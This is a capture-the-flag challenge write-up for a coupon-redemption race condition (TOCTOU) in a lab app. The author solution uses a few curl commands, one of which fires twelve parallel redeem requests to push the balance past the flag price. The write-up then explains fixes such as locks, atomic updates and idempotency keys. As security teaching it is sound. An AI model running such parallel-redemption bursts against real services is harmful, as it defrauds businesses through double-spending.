# Race Condition — CouponStore

A "redeem promo coupon" endpoint with the classic check-then-act
race. The server reads `coupon.used`, sleeps 250ms simulating slow
DB I/O, then increments. Twelve concurrent requests all see
`used=0` and all add `+100` to your balance. Stack the bonus until
you can afford the flag.

## Player target

Reach balance ≥ 1000 credits, then POST `/buy-flag`.

## Author solution

```bash
# 1. Get a session cookie
curl -s -c jar.txt http://target:5000/ > /dev/null

# 2. Fire 12 redeems in parallel — the 250ms TOCTOU window swallows them.
seq 12 | xargs -n1 -P12 -I{} curl -s -b jar.txt \
  -X POST http://target:5000/redeem \
  -H 'content-type: application/json' \
  -d '{"code":"WELCOME100"}'

# 3. Check balance
curl -s -b jar.txt http://target:5000/balance
# {"balance": 1200}

# 4. Buy
curl -s -b jar.txt -X POST http://target:5000/buy-flag
# {"flag": "CTF{REDACTED}"}
```

## Why this is the lesson

Whenever you have a check-then-act sequence over shared mutable
state, race conditions are the default — not the exception. Fix
options, ordered from worst to best:

1. **Wrap in a lock** (threading.Lock / mutex). Cheap, easy, but
   serialises a hot path.
2. **Move the check into the write** — an atomic
   compare-and-swap. e.g. `UPDATE coupons SET used = used + 1
   WHERE used < max_uses` and check the affected-row count.
3. **Re-derive truth on every read** rather than caching a counter
   the attacker can race past.
4. **Idempotency keys** so duplicate redemptions are deduplicated
   server-side.

Real-world incidents: Starbucks gift cards (2015), Coinbase Brazil
(2017), countless coupon abuses every Black Friday.
